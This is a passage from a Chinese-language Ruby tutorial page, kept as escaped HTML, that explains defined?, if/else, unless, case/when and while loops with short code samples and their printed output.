unpack&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; nil (not defined here)&lt;/span&gt;</code><br>16.  <code>&lt;span class=&quot;pun&quot;&gt;用法&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;</code><br>17.  <code>&lt;span class=&quot;com&quot;&gt;# True if a method exists that can be called with super user&lt;/span&gt;</code><br>18.  <code>&lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; super&lt;/span&gt;</code><br>19.  <code>&lt;span class=&quot;pun&quot;&gt;例如&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>20.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>21.  <code>&lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; super&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; &quot;super&quot; (if it can be called)&lt;/span&gt;</code><br>22.  <code>&lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; super&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; nil (if it cannot be)&lt;/span&gt;</code><br>23.  <code>&lt;span class=&quot;pun&quot;&gt;用法&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;</code><br>24.  <code>&lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; yield&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# True if a code block has been passed&lt;/span&gt;</code><br>25.  <code>&lt;span class=&quot;pun&quot;&gt;例如&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;</code><br>26.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>27.  <code>&lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; yield&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; &quot;yield&quot; (if there is a block passed)&lt;/span&gt;</code><br>28.  <code>&lt;span class=&quot;pln&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; yield&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# =&amp;gt; nil (if there is no block)&lt;/span&gt;</code></pre></div><div><br></div></div></div><h3 id="7-逻辑结构"><a href="#7-逻辑结构" class="headerlink" title="7.逻辑结构"></a>7.逻辑结构</h3><div><strong>if…else 语句：</strong></div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; x &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;x is greater than 2&quot;&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;elsif x &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; and x&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;x is 1&quot;&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;</code><br>9.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;I can&#39;t guess the number&quot;&lt;/span&gt;</code><br>10.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code><br>11.  <code>&lt;span class=&quot;pln&quot;&gt;x is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code></pre></div><div><strong>单if：</strong></div></div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;code &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; condition&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;条件为真执行代码。&lt;/span&gt;</code></pre></div><div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;$debug&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;print &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;debug\n&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $debug&lt;/span&gt;</code></pre></div></div><div>这将产生以下结果：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;debug&lt;/span&gt;</code></pre></div><div><strong>unless else：</strong></div></div></div></div><div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;unless conditional &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; code&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; code &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></pre></div></div><div>如果条件为false，执行代码。如果条件是true，else子句中指定的代码被执行。</div><div>例如：</div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;unless x&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;x is less than 2&quot;&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;x is greater than 2&quot;&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></pre></div><div>这将产生以下结果：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;x is less than &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;</code></pre></div><div><strong>单unless：</strong></div></div></div><div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;code unless conditional&lt;/span&gt;</code></pre></div></div><div>执行代码，如果有条件的话为false。</div><div>实例:</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;$var &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;print &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;1 -- Value is set\n&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $var&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;print &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;2 -- Value is set\n&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; unless $var&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;$var &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;false&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;print &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;3 -- Value is set\n&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; unless $var&lt;/span&gt;</code></pre></div></div><div>这将产生以下结果：<span style="color: rgb(72, 72, 76); font-family: Consolas, 'Liberation Mono', Menlo, Courier, monospace; line-height: 18px; font-size: 13px;">&nbsp;</span></div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;set&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; is &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;set&lt;/span&gt;</code></pre></div><div><strong>case：</strong></div></div></div><div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;kwd&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expression&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;when expression &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expression &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;...]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; code &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]...&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; code &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></pre></div></div><div>比较表达式指定的情况下，使用===运算符时，按指定的条款相匹配时执行的代码。</div><div>子句计算 when 与左操作数指定的表达式。如果没有子句匹配时，情况下执行的代码else子句。</div><div>when 语句的表达保留字，那么，一个换行符或分号分开代码。</div><div>那么:</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;kwd&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expr0&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;when expr1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expr2&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; stmt1&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;when expr3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expr4&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; stmt2&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; stmt3&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></pre></div></div><div>基本上类似于以下内容：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;_tmp &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expr0&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expr1 &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; _tmp &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expr2 &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; _tmp&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; stmt1&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;elsif expr3 &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; _tmp &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; expr4 &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;===&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; _tmp&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; stmt2&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; stmt3&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></pre></div><div>例子：</div></div></div><div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;$age &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;kwd&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $age&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;when &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;baby&quot;&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;when &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;6&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;little child&quot;&lt;/span&gt;</code><br>9.  <code>&lt;span class=&quot;pln&quot;&gt;when &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;12&lt;/span&gt;</code><br>10.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;child&quot;&lt;/span&gt;</code><br>11.  <code>&lt;span class=&quot;pln&quot;&gt;when &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;18&lt;/span&gt;</code><br>12.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;youth&quot;&lt;/span&gt;</code><br>13.  <code>&lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;</code><br>14.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;adult&quot;&lt;/span&gt;</code><br>15.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></pre></div></div><div>这将产生以下结果：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;little child&lt;/span&gt;</code></pre></div><div><strong>while：</strong></div></div></div><div>语法1:</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;kwd&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; conditional &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; code&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></pre></div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;$i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;$num &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;kwd&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $num&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Inside the loop i = #$i&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; $i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code><br>9.  <code>&lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;</code></pre></div><div><div>这将产生以下结果：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;</code></pre></div><div>语法2:</div></div></div></div></div><div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;pln&quot;&gt;code &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; condition&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;OR&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;begin&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; code&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;end &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; conditional&lt;/span&gt;</code></pre></div></div><div>执行代码，当条件为true。</div><div>如果while 修饰符紧跟一个begin 语句但是没有 rescue 或 ensure 子句, 代码被执行前一次条件求值。</div></div><div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pln&quot;&gt;$i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pln&quot;&gt;$num &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;begin&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Inside the loop i = #$i&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; $i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;end &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $num&lt;/span&gt;</code></pre></div></div><div>这将产生以下结果：</div><div><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; 